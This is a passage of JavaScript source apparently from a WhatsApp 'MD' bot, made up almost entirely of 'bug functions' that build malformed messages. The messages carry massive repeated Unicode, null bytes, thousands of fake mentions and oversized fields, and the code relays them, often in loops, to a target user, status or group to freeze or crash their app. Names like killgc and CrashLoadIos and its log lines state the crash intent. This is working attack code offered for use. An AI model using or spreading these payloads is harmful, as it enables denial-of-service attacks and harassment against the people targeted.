                                    "13135550002@s.whatsapp.net",
                                    ...Array.from({ length: 30000 }, () =>
                                        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                    )
                                ]
                            },
                            streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                            thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                            annotations: [
                                {
                                    embeddedContent: {
                                        embeddedMusic: {
                                            musicContentMediaId: "kontol",
                                            songId: "peler",
                                            author: "\u9999",
                                            title: "\u9999",
                                            artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                            artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                            artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                            countryBlocklist: true,
                                            isExplicit: true,
                                            artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                        }
                                    },
                                    embeddedAction: null
                                }
                            ]
                        }
                    }
                }
            }, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                            }
                        ]
                    }
                ]
            });

            if (mention) {
                await empire.relayMessage(target, {
                    groupStatusMentionMessage: {
                        message: { protocolMessage: { key: msg.key, type: 25 } }
                    }
                }, {
                    additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
                });
            }
        }
        //======================================

        async function delayMakerInvisible(isTarget) {
            let venomModsData = JSON.stringify({
                status: true,
                criador: "VenomMods",
                resultado: {
                    type: "md",
                    ws: {
                        _events: {
                            "CB:ib,,dirty": ["Array"]
                        },
                        _eventsCount: 800000,
                        _maxListeners: 0,
                        url: "wss://web.whatsapp.com/ws/chat",
                        config: {
                            version: ["Array"],
                            browser: ["Array"],
                            waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
                            connCectTimeoutMs: 20000,
                            keepAliveIntervalMs: 30000,
                            logger: {},
                            printQRInTerminal: false,
                            emitOwnEvents: true,
                            defaultQueryTimeoutMs: 60000,
                            customUploadHosts: [],
                            retryRequestDelayMs: 250,
                            maxMsgRetryCount: 5,
                            fireInitQueries: true,
                            auth: {
                                Object: "authData"
                            },
                            markOnlineOnconnCect: true,
                            syncFullHistory: true,
                            linkPreviewImageThumbnailWidth: 192,
                            transactionOpts: {
                                Object: "transactionOptsData"
                            },
                            generateHighQualityLinkPreview: false,
                            options: {},
                            appStateMacVerification: {
                                Object: "appStateMacData"
                            },
                            mobile: true
                        }
                    }
                }
            });
            let stanza = [{
                attrs: {
                    biz_bot: "1"
                },
                tag: "bot"
            }, {
                attrs: {},
                tag: "biz"
            }];
            let message = {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 3.2,
                            isStatusBroadcast: true,
                            statusBroadcastJid: "status@broadcast",
                            badgeChat: {
                                unreadCount: 9999
                            }
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "proto@newsletter",
                            serverMessageId: 1,
                            newsletterName: `—͟͞͞🧊 공격 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2* ${"—͟͞͞🧊 공격 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2*".repeat(10)}`,
                            contentType: 3,
                            accessibilityText: `—͟͞͞🧊 공격 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2* ${"﹏".repeat(102002)}`
                        },
                        interactiveMessage: {
                            contextInfo: {
                                businessMessageForwardInfo: {
                                    businessOwnerJid: isTarget
                                },
                                dataSharingContext: {
                                    showMmDisclosure: true
                                },
                                participant: "0@s.whatsapp.net",
                                mentionedJid: ["13135550002@s.whatsapp.net"]
                            },
                            body: {
                                text: "" + "ꦽ".repeat(302002) + "".repeat(102002)
                            },
                            nativeFlowMessage: {
                                buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "payment_method",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "call_permission_request",
                                    buttonParamsJson: venomModsData + "".repeat(9999),
                                    voice_call: "call_galaxy"
                                }, {
                                    name: "form_message",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "wa_payment_learn_more",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "wa_payment_transaction_details",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "wa_payment_fbpin_reset",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "catalog_message",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "payment_info",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "review_order",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "send_location",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "payments_care_csat",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "view_product",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "payment_settings",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "address_message",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "automated_greeting_message_view_catalog",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "open_webview",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "message_with_link_status",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "payment_status",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "galaxy_costum",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "extensions_message_v2",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                name: "landline_call",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "mpm",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "cta_copy",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "cta_url",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "review_and_pay",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "galaxy_message",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }, {
                                    name: "cta_call",
                                    buttonParamsJson: venomModsData + "".repeat(9999)
                                }]
                            }
                        }
                    },
                    additionalNodes: stanza,
                    stanzaId: `stanza_${Date.now()}`
                }
            }
            await empire.relayMessage(isTarget, message, {
                participant: {
                    jid: isTarget
                }
            });
        }
        //================================°==
                DelayGroup

        async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
            const delaymention = Array.from({ length: 30000 }, (_, r) => ({
                title: "᭡꧈".repeat(95000),
                rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
            }));

            const MSG = {
                viewOnceMessage: {
                    message: {
                        listResponseMessage: {
                            title: "*𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2  is Here bitches*",
                            listType: 2,
                            buttonText: null,
                            sections: delaymention,
                            singleSelectReply: { selectedRowId: "🔴" },
                            contextInfo: {
                                mentionedJid: Array.from({ length: 30000 }, () =>
                                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                ),
                                participant: target,
                                remoteJid: "status@broadcast",
                                forwardingScore: 9741,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "333333333333@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "-"
                                }
                            },
                            description: "*𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2t Bothering Me Bro!!*"
                        }
                    }
                },
                contextInfo: {
                    channelMessage: true,
                    statusAttributionType: 2
                }
            };

            const msg = generateWAMessageFromContent(target, MSG, {});

            await empire.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined
                                    }
                                ]
                            }
                        ]
                    }
                ]
            });

            // **Cek apakah mention true sebelum menjalankan relayMessage**
            if (mention) {
                await empire.relayMessage(
                    target,
                    {
                        statusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25
                                }
                            }
                        }
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "*𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 crasher Here Bro*" },
                                content: undefined
                            }
                        ]
                    }
                );
            }
        }

        async function FreezeGC(FuckMark, jids = false) {
            var messageContent = generateWAMessageFromContent(FuckMark, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        "newsletterAdminInviteMessage": {
                            "newsletterJid": `120363420088299543@newsletter`,
                            "newsletterName": "AditJmK" + "48".repeat(80000) + "\u0000".repeat(920000),
                            "jpegThumbnail": "",
                            "caption": `JMK 4EvER`,
                            "inviteExpiration": Date.now() + 1814400000
                        }
                    }
                }
            }), {
                'userJid': FuckMark
            });
            await empire.relayMessage(FuckMark, messageContent.message, jids ? {
                'participant': {
                    'jid': FuckMark
                }
            } : {});
        }

        async function CrashLoadIos(empire, target) {
            const LocationMessage = {
                locationMessage: {
                    degreesLatitude: 21.1266,
                    degreesLongitude: -11.8199,
                    name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
                    url: "https://t.me/rizxvelzdev",
                    contextInfo: {
                        externalAdReply: {
                            quotedAd: {
                                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                                mediaType: "IMAGE",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
                            },
                            placeholderKey: {
                                remoteJid: "0s.whatsapp.net",
                                fromMe: false,
                                id: "ABCDEF1234567890"
                            }
                        }
                    }
                }
            };

            await empire.relayMessage(target, LocationMessage, {
                participant: { jid: target }
            });
            console.log(randomColor()(`─────「 ⏤!CrashIOS To: ${target}!⏤ 」─────`))
        }
        // BUG FUNCTIONS

        async function crashChannel(target) {
            await empire.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        groupStatusMentionMessage: {
                            name: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 - ᴄʀᴀsʜ",
                            jid: target,
                            mention: ["13135550002@s.whatsapp.net"],
                            contextInfo: {
                                businessOwnerJid: "13135550002@s.whatsapp.net"
                            }
                        }
                    }
                }
            }, {});
        }
        // BUG FUNCTIONS
        async function swVidFreeze(target, sebut = false) {
            for (let z = 0; z < 50; z++) {
                const media = generateWAMessageFromContent(target, {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "OU+MmRfL9SSO0MZI2VcrC8/Vqr8U+bkKE/bnTg74YY8=",
                        fileLength: 252408,
                        seconds: 15,
                        mediaKey: "Nw/2xPEw0z5yDWluRdpNDAZn8lWUFH1Ui6yjpUoDHpk=",
                        height: 816,
                        width: 768,
                        fileEncSha256: "vz7HOSPHOcj3R8De5glz20ktBJIt8LhkN8gX5t2nLNI=",
                        directPath: "/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0",
                        mediaKeyTimestamp: 1761536267,
                        caption: "Radiation - Ex3cutor" + "ꦾ".repeat(22),
                        contextInfo: {
                            statusAttributionType: 2,
                            isForwarded: true,
                            forwardingScore: 7202508,
                            forwardedAiBotMessageInfo: {
                                botJid: "13135550002@bot",
                                botName: "Meta AI",
                                creatorName: "7eppeli - Yuukey"
                            },
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
                        },
                        streamingSidecar: "ZCTXLaWRSUS57M2WDi5Rmxk1kq9Jm8uPJAtt0Qm2Pdxh3hRYFM3IOg==",
                        thumbnailDirectPath: "/v/t62.36147-24/531652303_1341445584346193_3521117362172863397_n.enc?ccb=11-4&oh=01_Q5Aa2wEK08NNxekWOl2uTJONY8JpIjdWijZ8uBMRvlhIv7lFWw&oe=6926531E&_nc_sid=5e03e0",
                        thumbnailSha256: "XFmelyVsc04pajE/UH7cqxRIbOT8FF2PPqnjo/jIdDg=",
                        thumbnailEncSha256: "B4u4FhVwI1OC3DTOuSLxwv5NKTJ5s3YFfZ/oqrI8hpE=",
                        annotations: [
                            {
                                shouldSkipConfirmation: true,
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "1328419335741957",
                                        songId: "1221313878044460",
                                        author: "7eppeli.pdf",
                                        title: "ꦾ".repeat(9000),
                                        artworkDirectPath: "/v/t62.76458-24/538001898_1721507205206204_1856297105077950312_n.enc?ccb=11-4&oh=01_Q5Aa2wG6vgDeEBNpBou9E_hlOwfQid9sttzm8sXIT_GL-MyJYQ&oe=692643CB&_nc_sid=5e03e0",
                                        artworkSha256: "DQIz0Oj5q9X3DMmLIAEZ+0dGN0tVWWhKx7AMgOtuhCs=",
                                        artworkEncSha256: "pzljQhAsS8uKKVvBHwYhjFhYXb2oz7Ha6io5qu7oBW4=",
                                        artistAttribution: "https://id.Zeppeli.pdf",
                                        countryBlocklist: "+62",
                                        isExplicit: true,
                                        artworkMediaKey: "+O9eJ1/zuS2GRYDWkHgK7nohkP5zRIMAEhnmObrU6E0="
                                    }
                                },
                                embeddedAction: true
                            }
                        ]
                    }
                }, {});
                const additionalNodes = [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    }
                                ],
                            }
                        ],
                    }
                ];
                await empire.relayMessage("status@broadcast", media.message, {
                    messageId: media.key.id,
                    statusJidList: [target],
                    additionalNodes,
                });
            }
            if (sebut) {
                let empire = generateWAMessageFromContent(target, proto.Message.fromObject({
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: media.key,
                                type: "STATUS_MENTION_MESSAGE",
                                timestamp: Date.now() + 720,
                            },
                        },
                    }
                }), {})
                await empire.relayMessage(target, demmy.message, {
                    participant: { jid: target },
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "true" },
                            content: undefined,
                        }
                    ],
                });
            }
        }
        // end of Bug function
        // BUG FUNCTIONS 
                
        async function gsInter(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                        },
                        body: {
                            text: "\u0000".repeat(200),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});

                await empire.relayMessage(target, {
                    groupStatusMessageV2: {
                        message: msg.message
                    }
                }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }
        // end of Bug function 
        // BUG FUNCTIONS
        async function Delay1(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                        },
                        body: {
                            text: "\u0000".repeat(200),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});

                await empire.relayMessage(target, {
                    groupStatusMessageV2: {
                        message: msg.message
                    }
                }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }
        // end of Bug function 
        // BUG FUNCTIONS 
        
        async function delay2(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                        },
                        body: {
                            text: "\u0000".repeat(200),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});

                await empire.relayMessage(target, {
                    groupStatusMessageV2: {
                        message: msg.message
                    }
                }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }
        // end of Bug function 
        // BUG FUNCTIONS 
        async function kill(target, zid = true) {
            for (let z = 0; z < 75; z++) {
                let msg = generateWAMessageFromContent(target, {
                    interactiveResponseMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                        },
                        body: {
                            text: "\u0000".repeat(200),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                            version: 3
                        }
                    }
                }, {});

                await empire.relayMessage(target, {
                    groupStatusMessageV2: {
                        message: msg.message
                    }
                }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
            }
        }
        // end of Bug functions
        
        //=========== ONE MESSAGE FC =========//
        async function oneMsgFC(empire, target) {
            const sockUrl = 'https://files.catbox.moe/mxg7vh.mp4';
            const video = await prepareWAMessageMedia(
                { video: { url: sockUrl } },
                { upload: demmy.waUploadToServer }
            );

            const videoMessage = {
                videoMessage: video.videoMessage,
                hasMediaAttachment: false,
                contextInfo: {
                    forwardingScore: 666,
                    isForwarded: true,
                    stanzaId: String(Date.now()),
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    quotedMessage: {
                        extendedTextMessage: {
                            text: "",
                            contextInfo: {
                                mentionedJid: [target],
                                externalAdReply: {
                                    title: "",
                                    body: "",
                                    thumbnailUrl: "",
                                    mediaType: 1,
                                    sourceUrl: "</> 𝙳εmmყ τεch 🪬 ཀ‌",
                                    showAdAttribution: false
                                }
                            }
                        }
                    }
                }
            };

            const cards = [];
            for (let i = 0; i < 10; i++) {
                cards.push({
                    header: videoMessage,
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000)
                    }
                });
            }

            const interactive = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: "" },
                            carouselMessage: {
                                cards: cards,
                                messageVersion: 1
                            },
                            contextInfo: {
                                businessMessageForwardInfo: {
                                    businessOwnerJid: target
                                },
                                stanzaId: String(Math.floor(Math.random() * 99999)),
                                forwardingScore: 100,
                                isForwarded: true,
                                mentionedJid: [target],
                                externalAdReply: {
                                    title: "",
                                    body: "",
                                    thumbnailUrl: "radιaтιon craѕн ғc",
                                    mediaType: 1,
                                    mediaUrl: "",
                                    sourceUrl: "</> 𝙳εmmყ τεch 🪬 ཀ‌",
                                    showAdAttribution: false
                                }
                            }
                        }
                    }
                }
            };

            const message = generateWAMessageFromContent(target, interactive, { quoted: m });

            await empire.relayMessage(target, message.message, {
                participant: { jid: target },
                messageId: message.key.id
            });
        }
        //=================END OF FUNCTION====//
        // BUG FUNCTIONS 
        
        async function rageioshere(target) {
            let tmsg = await generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: '@Radiation\n' + "\n\n\n" + "𑪆".repeat(60000),
                    previewType: 0,
                    contextInfo: {
                        mentionedJid: [target]
                    }
                }
            }, {});

            await empire.relayMessage("status@broadcast", tmsg.message, {
                messageId: tmsg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: target },
                            content: undefined,
                        }],
                    }],
                }],
            });
        }
        // end of Bug function 
        // BUG FUNCTIONS
        async function zalthrexhytam(empire, target) {
            empire.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                hasMediaAttachment: false,
                                title: "Radiation¿"
                                    + "ꦽ".repeat(50000),
                            },
                            body: {
                                text: "",
                            },
                            nativeFlowMessage: {
                                name: "single_select",
                                messageParamsJson: "",
                            },
                            payment: {
                                name: "galaxy_message",
                                messageParamsJson: '{"icon":"DOCUMENT","flow_cta":"\\u0000","flow_message_version":"3"}',
                            },
                        },
                    },
                },
            },
                {}
            );
        }
        // end Of Function
        //=============GROUP BUGS===========//
     
        async function rusuhgc(target) {
            try {
                const msg = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: "33333333333333333@newsletter",
                                newsletterName: "Mode Rusuh😹" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [{
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }, {
                            name: "galaxy_message",
                            paramsJson: {
                                screen_2_OptIn_0: true,
                                screen_2_OptIn_1: true,
                                screen_1_Dropdown_0: "nullOnTop",
                                screen_1_DatePicker_1: "1028995200000",
                                screen_1_TextInput_2: "null@gmail.com",
                                screen_1_TextInput_3: "94643116",
                                screen_0_TextInput_0: "\0".repeat(500000),
                                screen_0_TextInput_1: "SecretDocu",
                                screen_0_Dropdown_2: "#926-Xnull",
                                screen_0_RadioButtonsGroup_3: "0_true",
                                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                            }
                        }]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 5
                        }, () => "0@s.whatsapp.net"),
                        groupMentions: [{
                            groupJid: "0@s.whatsapp.net",
                            groupSubject: "Vampire"
                        }]
                    }
                };
                await empire.relayMessage(target, msg, {
                    userJid: target
                });
            } catch (err) {
                console.error("Error sending newsletter:", err);
            }
        }

        //========KILL GC BUG FUNC==========//
           
        async function killgc(target) {
            let massage = [];
            for (let r = 0; r < 1000; r++) {
                massage.push({
                    fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
                    isAnimated: true,
                    accessibilityLabel: "",
                    isLottie: false,
                    mimetype: "image/webp"
                });
            }
            const msg = {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\0".repeat(1000000),
                            version: 3
                        },
                        stickerPackMessage: {
                            stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
                            name: "WOI GRUP KONTOL",
                            publisher: "",
                            stickers: massage,
                            fileLength: "999999999999999",
                            fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
                            fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
                            mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
                            directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "99999999",
                            trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
                            thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
                            thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
                            thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
                            thumbnailHeight: 99999999999,
                            thumbnailWidth: 9999999999,
                            imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
                            stickerPackSize: 9999999999999,
                            stickerPackOrigin: 9999999999999,
                            contextInfo: {
                                mentionedJid: Array.from({
                                    length: 30000
                                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                                isSampled: true,
                                participant: target,
                                remoteJid: target,
                                forwardingScore: 9741,
                                isForwarded: true,
                                businessMessageForwardInfo: {
                                    businessOwnerJid: target
                                },
                                externalAdReply: {
                                    title: "*NEXORA MD KILLED YOU🩸*",
                                    body: "Grup Kontol"
                                }
                            }
                        }
                    }
                }
            };
            await empire.relayMessage(target, msg, {});
        }
        // END OF FUNC //
        //========BLANK GC========//
        
        async function blankgc(target) {
            empire.relayMessage(target, {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363420088299543@newsletter",
                    newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "XxX".repeat(9000),
                    caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "XxX".repeat(9000),
                    inviteExpiration: "0",
                },
            }, {
                userJid: target
            })
        }
        // END OF BUG FUNCTIONS 
        //=====COMBINING ALL GC BUG======//
        async function occolotopysV3(empire, target, mention = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () => `1@s.whatsapp.net`)
      },
      body: {
        text: "X",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await empire.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    mention
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
  );

  console.log(chalk.red(`Succes Sending Bug To ${target}`));
}

async function blankSticker(empire, target) {
    await empire.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name:
